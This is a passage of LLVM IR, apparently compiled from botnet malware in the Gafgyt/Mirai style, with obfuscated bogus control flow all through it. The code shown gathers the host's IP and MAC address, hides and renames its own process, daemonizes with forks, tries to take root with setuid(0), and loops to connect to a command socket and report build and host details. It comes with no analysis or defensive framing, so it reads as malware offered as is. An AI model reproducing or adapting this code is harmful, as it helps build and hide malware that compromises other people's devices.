  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %73
  %83 = load i32, i32* @x.125
  %84 = load i32, i32* @y.126
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %74, label %91, label %117

; <label>:91:                                     ; preds = %originalBBpart212
  %92 = load i32, i32* @x.125
  %93 = load i32, i32* @y.126
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %91
  %100 = load i32, i32* %14, align 4
  %101 = load i8*, i8** %12, align 8
  %102 = load i32, i32* %16, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds i8, i8* %101, i64 %103
  %105 = call i64 @read(i32 %100, i8* %104, i64 1)
  %106 = trunc i64 %105 to i32
  store i32 %106, i32* %15, align 4
  %107 = load i32, i32* %16, align 4
  %108 = add nsw i32 %107, 1
  store i32 %108, i32* %16, align 4
  %109 = load i32, i32* @x.125
  %110 = load i32, i32* @y.126
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBBpart222, label %originalBB14alteredBB

originalBBpart222:                                ; preds = %originalBB14
  br label %25

; <label>:117:                                    ; preds = %originalBBpart212
  %118 = load i32, i32* %15, align 4
  %119 = icmp eq i32 %118, 0
  br i1 %119, label %120, label %137

; <label>:120:                                    ; preds = %117
  %121 = load i32, i32* @x.125
  %122 = load i32, i32* @y.126
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %120
  %129 = load i32, i32* @x.125
  %130 = load i32, i32* @y.126
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBBpart227, label %originalBB24alteredBB

originalBBpart227:                                ; preds = %originalBB24
  br label %155

; <label>:137:                                    ; preds = %117
  %138 = load i32, i32* @x.125
  %139 = load i32, i32* @y.126
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %137
  %146 = load i8*, i8** %12, align 8
  %147 = load i32, i32* @x.125
  %148 = load i32, i32* @y.126
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %155

; <label>:155:                                    ; preds = %originalBBpart231, %originalBBpart227
  %156 = phi i8* [ null, %originalBBpart227 ], [ %146, %originalBBpart231 ]
  %157 = load i32, i32* @x.125
  %158 = load i32, i32* @y.126
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %155
  %165 = load i32, i32* @x.125
  %166 = load i32, i32* @y.126
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  ret i8* %156

originalBBalteredBB:                              ; preds = %originalBB, %3
  %173 = alloca i8*, align 8
  %174 = alloca i32, align 4
  %175 = alloca i32, align 4
  %176 = alloca i32, align 4
  %177 = alloca i32, align 4
  store i8* %0, i8** %173, align 8
  store i32 %1, i32* %174, align 4
  store i32 %2, i32* %175, align 4
  store i32 1, i32* %176, align 4
  store i32 0, i32* %177, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %25
  %178 = load i32, i32* %15, align 4
  %179 = icmp eq i32 %178, 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %44
  %180 = load i32, i32* %16, align 4
  %181 = load i32, i32* %13, align 4
  %182 = icmp slt i32 %180, %181
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %73
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %91
  %183 = load i32, i32* %14, align 4
  %184 = load i8*, i8** %12, align 8
  %185 = load i32, i32* %16, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds i8, i8* %184, i64 %186
  %188 = call i64 @read(i32 %183, i8* %187, i64 1)
  %189 = trunc i64 %188 to i32
  store i32 %189, i32* %15, align 4
  %190 = load i32, i32* %16, align 4
  %_ = shl i32 %190, 1
  %_15 = sub i32 0, %190
  %gen = add i32 %_15, 1
  %_16 = sub i32 %190, 1
  %gen17 = mul i32 %_16, 1
  %_18 = shl i32 %190, 1
  %_19 = sub i32 0, %190
  %gen20 = add i32 %_19, 1
  %191 = add nsw i32 %190, 1
  store i32 %191, i32* %16, align 4
  br label %originalBB14

originalBB24alteredBB:                            ; preds = %originalBB24, %120
  br label %originalBB24

originalBB29alteredBB:                            ; preds = %originalBB29, %137
  %192 = load i8*, i8** %12, align 8
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %155
  br label %originalBB33
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %32

; <label>:15:                                     ; preds = %0
  %16 = load i32, i32* @x.127
  %17 = load i32, i32* @y.128
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  store i32 0, i32* %1, align 4
  %24 = load i32, i32* @x.127
  %25 = load i32, i32* @y.128
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %245

; <label>:32:                                     ; preds = %0
  %33 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 16, i32 4, i1 false)
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.960, i32 0, i32 0)) #5
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %37 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %36, i32 0, i32 0
  store i32 %35, i32* %37, align 4
  %38 = call zeroext i16 @htons(i16 zeroext 53) #10
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  %40 = load i32, i32* %2, align 4
  %41 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %4, align 4
  %43 = load i32, i32* %4, align 4
  %44 = icmp eq i32 %43, -1
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %32
  store i32 0, i32* %1, align 4
  br label %245

; <label>:46:                                     ; preds = %32
  store i32 16, i32* %6, align 4
  %47 = load i32, i32* %2, align 4
  %48 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %49 = call i32 @getsockname(i32 %47, %struct.sockaddr* %48, i32* %6) #5
  store i32 %49, i32* %4, align 4
  %50 = load i32, i32* %4, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %46
  store i32 0, i32* %1, align 4
  br label %245

; <label>:53:                                     ; preds = %46
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %55 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %54, i32 0, i32 0
  %56 = load i32, i32* %55, align 4
  store i32 %56, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %57 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.961, i32 0, i32 0), i32 0)
  store i32 %57, i32* %7, align 4
  br label %58

; <label>:58:                                     ; preds = %originalBBpart216, %53
  %59 = load i32, i32* @x.127
  %60 = load i32, i32* @y.128
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %58
  %67 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %68 = load i32, i32* %7, align 4
  %69 = call i8* @fdgets(i8* %67, i32 4096, i32 %68)
  %70 = icmp ne i8* %69, null
  %71 = load i32, i32* @x.127
  %72 = load i32, i32* @y.128
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %70, label %79, label %145

; <label>:79:                                     ; preds = %originalBBpart24
  %80 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %81 = call i8* @strstr(i8* %80, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.962, i32 0, i32 0)) #9
  %82 = icmp ne i8* %81, null
  br i1 %82, label %83, label %127

; <label>:83:                                     ; preds = %79
  %84 = load i32, i32* @x.127
  %85 = load i32, i32* @y.128
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %83
  %92 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %92, i8** %9, align 8
  %93 = load i32, i32* @x.127
  %94 = load i32, i32* @y.128
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %101

; <label>:101:                                    ; preds = %106, %originalBBpart28
  %102 = load i8*, i8** %9, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp ne i32 %104, 9
  br i1 %105, label %106, label %109

; <label>:106:                                    ; preds = %101
  %107 = load i8*, i8** %9, align 8
  %108 = getelementptr inbounds i8, i8* %107, i32 1
  store i8* %108, i8** %9, align 8
  br label %101

; <label>:109:                                    ; preds = %101
  %110 = load i32, i32* @x.127
  %111 = load i32, i32* @y.128
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %109
  %118 = load i8*, i8** %9, align 8
  store i8 0, i8* %118, align 1
  %119 = load i32, i32* @x.127
  %120 = load i32, i32* @y.128
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %145

; <label>:127:                                    ; preds = %79
  %128 = load i32, i32* @x.127
  %129 = load i32, i32* @y.128
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %127
  %136 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %136, i8 0, i64 4096, i32 16, i1 false)
  %137 = load i32, i32* @x.127
  %138 = load i32, i32* @y.128
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %58

; <label>:145:                                    ; preds = %originalBBpart212, %originalBBpart24
  %146 = load i32, i32* @x.127
  %147 = load i32, i32* @y.128
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %145
  %154 = load i32, i32* %7, align 4
  %155 = call i32 @close(i32 %154)
  %156 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %157 = load i8, i8* %156, align 16
  %158 = icmp ne i8 %157, 0
  %159 = load i32, i32* @x.127
  %160 = load i32, i32* @y.128
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %158, label %167, label %242

; <label>:167:                                    ; preds = %originalBBpart220
  %168 = load i32, i32* @x.127
  %169 = load i32, i32* @y.128
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %167
  %176 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %177 = bitcast %union.anon.5* %176 to [16 x i8]*
  %178 = getelementptr inbounds [16 x i8], [16 x i8]* %177, i32 0, i32 0
  %179 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %180 = call i8* @strcpy(i8* %178, i8* %179) #5
  %181 = load i32, i32* %2, align 4
  %182 = call i32 (i32, i64, ...) @ioctl(i32 %181, i64 35111, %struct.ifreq* %11) #5
  store i32 0, i32* %10, align 4
  %183 = load i32, i32* @x.127
  %184 = load i32, i32* @y.128
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %191

; <label>:191:                                    ; preds = %originalBBpart231, %originalBBpart224
  %192 = load i32, i32* %10, align 4
  %193 = icmp slt i32 %192, 6
  br i1 %193, label %194, label %225

; <label>:194:                                    ; preds = %191
  %195 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %196 = bitcast %union.anon.6* %195 to %struct.sockaddr*
  %197 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %196, i32 0, i32 1
  %198 = getelementptr inbounds [14 x i8], [14 x i8]* %197, i32 0, i32 0
  %199 = load i32, i32* %10, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds i8, i8* %198, i64 %200
  %202 = load i8, i8* %201, align 1
  %203 = load i32, i32* %10, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %204
  store i8 %202, i8* %205, align 1
  br label %206

; <label>:206:                                    ; preds = %194
  %207 = load i32, i32* @x.127
  %208 = load i32, i32* @y.128
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %206
  %215 = load i32, i32* %10, align 4
  %216 = add nsw i32 %215, 1
  store i32 %216, i32* %10, align 4
  %217 = load i32, i32* @x.127
  %218 = load i32, i32* @y.128
  %219 = sub i32 %217, 1
  %220 = mul i32 %217, %219
  %221 = urem i32 %220, 2
  %222 = icmp eq i32 %221, 0
  %223 = icmp slt i32 %218, 10
  %224 = or i1 %222, %223
  br i1 %224, label %originalBBpart231, label %originalBB26alteredBB

originalBBpart231:                                ; preds = %originalBB26
  br label %191

; <label>:225:                                    ; preds = %191
  %226 = load i32, i32* @x.127
  %227 = load i32, i32* @y.128
  %228 = sub i32 %226, 1
  %229 = mul i32 %226, %228
  %230 = urem i32 %229, 2
  %231 = icmp eq i32 %230, 0
  %232 = icmp slt i32 %227, 10
  %233 = or i1 %231, %232
  br i1 %233, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %225
  %234 = load i32, i32* @x.127
  %235 = load i32, i32* @y.128
  %236 = sub i32 %234, 1
  %237 = mul i32 %234, %236
  %238 = urem i32 %237, 2
  %239 = icmp eq i32 %238, 0
  %240 = icmp slt i32 %235, 10
  %241 = or i1 %239, %240
  br i1 %241, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %242

; <label>:242:                                    ; preds = %originalBBpart235, %originalBBpart220
  %243 = load i32, i32* %2, align 4
  %244 = call i32 @close(i32 %243)
  br label %245

; <label>:245:                                    ; preds = %242, %52, %45, %originalBBpart2
  %246 = load i32, i32* %1, align 4
  ret i32 %246

originalBBalteredBB:                              ; preds = %originalBB, %15
  store i32 0, i32* %1, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %58
  %247 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %248 = load i32, i32* %7, align 4
  %249 = call i8* @fdgets(i8* %247, i32 4096, i32 %248)
  %250 = icmp ne i8* %249, null
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %83
  %251 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %251, i8** %9, align 8
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %109
  %252 = load i8*, i8** %9, align 8
  store i8 0, i8* %252, align 1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %127
  %253 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %253, i8 0, i64 4096, i32 16, i1 false)
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %145
  %254 = load i32, i32* %7, align 4
  %255 = call i32 @close(i32 %254)
  %256 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %257 = load i8, i8* %256, align 16
  %258 = icmp ne i8 %257, 0
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %167
  %259 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %260 = bitcast %union.anon.5* %259 to [16 x i8]*
  %261 = getelementptr inbounds [16 x i8], [16 x i8]* %260, i32 0, i32 0
  %262 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %263 = call i8* @strcpy(i8* %261, i8* %262) #5
  %264 = load i32, i32* %2, align 4
  %265 = call i32 (i32, i64, ...) @ioctl(i32 %264, i64 35111, %struct.ifreq* %11) #5
  store i32 0, i32* %10, align 4
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %206
  %266 = load i32, i32* %10, align 4
  %_ = sub i32 %266, 1
  %gen = mul i32 %_, 1
  %_27 = sub i32 %266, 1
  %gen28 = mul i32 %_27, 1
  %267 = add nsw i32 %266, 1
  store i32 %267, i32* %10, align 4
  br label %originalBB26

originalBB33alteredBB:                            ; preds = %originalBB33, %225
  br label %originalBB33
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #3

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [10 x i8*], align 16
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.963, i32 0, i32 0), i8** %6, align 8
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @strlen(i8* %28) #9
  %30 = call i8* @strncpy(i8* %25, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.963, i32 0, i32 0), i64 %29) #5
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.963, i32 0, i32 0), i8** %32, align 8
  %33 = load i8*, i8** %6, align 8
  %34 = ptrtoint i8* %33 to i64
  %35 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %34, i32 0, i32 0, i32 0)
  %36 = call i64 @time(i64* null) #5
  %37 = call i32 @getpid() #5
  %38 = sext i32 %37 to i64
  %39 = xor i64 %36, %38
  %40 = trunc i64 %39 to i32
  call void @srand(i32 %40) #5
  %41 = call i64 @time(i64* null) #5
  %42 = call i32 @getpid() #5
  %43 = sext i32 %42 to i64
  %44 = xor i64 %41, %43
  %45 = trunc i64 %44 to i32
  call void @init_rand(i32 %45)
  %46 = call i32 @getOurIP()
  %47 = call i32 @fork() #5
  store i32 %47, i32* %7, align 4
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %49, label %52

; <label>:49:                                     ; preds = %2
  %50 = load i32, i32* %7, align 4
  %51 = call i32 @waitpid(i32 %50, i32* %9, i32 0)
  call void @exit(i32 0) #11
  unreachable

; <label>:52:                                     ; preds = %2
  %53 = load i32, i32* %7, align 4
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %98, label %55

; <label>:55:                                     ; preds = %52
  %56 = load i32, i32* @x.129
  %57 = load i32, i32* @y.130
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %55
  %64 = call i32 @fork() #5
  store i32 %64, i32* %8, align 4
  %65 = icmp ne i32 %64, 0
  %66 = load i32, i32* @x.129
  %67 = load i32, i32* @y.130
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %65, label %74, label %75

; <label>:74:                                     ; preds = %originalBBpart2
  call void @exit(i32 0) #11
  unreachable

; <label>:75:                                     ; preds = %originalBBpart2
  %76 = load i32, i32* %8, align 4
  %77 = icmp ne i32 %76, 0
  br i1 %77, label %79, label %78

; <label>:78:                                     ; preds = %75
  br label %96

; <label>:79:                                     ; preds = %75
  %80 = load i32, i32* @x.129
  %81 = load i32, i32* @y.130
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %79
  %88 = load i32, i32* @x.129
  %89 = load i32, i32* @y.130
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %96

; <label>:96:                                     ; preds = %originalBBpart24, %78
  br label %97

; <label>:97:                                     ; preds = %96
  br label %99

; <label>:98:                                     ; preds = %52
  br label %99

; <label>:99:                                     ; preds = %98, %97
  br label %100

; <label>:100:                                    ; preds = %99
  %101 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.964, i32 0, i32 0)) #5
  %102 = call i32 @setuid(i32 0) #5
  %103 = call i32 @seteuid(i32 0) #5
  %104 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  br label %105

; <label>:105:                                    ; preds = %originalBBpart28, %100
  %106 = call i32 @fork() #5
  %107 = icmp eq i32 %106, 0
  br i1 %107, label %108, label %729

; <label>:108:                                    ; preds = %105
  %109 = call i32 @initConnection()
  %110 = icmp ne i32 %109, 0
  br i1 %110, label %111, label %129

; <label>:111:                                    ; preds = %108
  %112 = load i32, i32* @x.129
  %113 = load i32, i32* @y.130
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %111
  %120 = call i32 @sleep(i32 5)
  %121 = load i32, i32* @x.129
  %122 = load i32, i32* @y.130
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %105

; <label>:129:                                    ; preds = %108
  %130 = load i32, i32* @mainCommSock, align 4
  %131 = call i8* @getBuildz()
  %132 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %133 = call i8* @inet_ntoa(i32 %132) #5
  %134 = call i8* @getBuild()
  %135 = call i32 @getEndianness()
